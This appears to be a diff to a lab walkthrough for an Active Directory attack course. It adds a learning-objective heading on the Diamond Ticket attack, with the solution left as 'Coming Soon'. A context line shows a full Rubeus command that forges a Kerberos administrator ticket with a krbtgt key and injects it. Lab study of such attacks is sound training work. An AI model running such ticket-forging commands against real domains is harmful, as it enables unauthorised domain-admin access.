@@ -195,5 +195,18 @@ Rubeus.exe diamond
 /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
+# **Learning Objective 10**
+
+
+- Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.
+
+
+
+## **Solution**
+
+
+**_Coming Soon_**
+
+
 
 
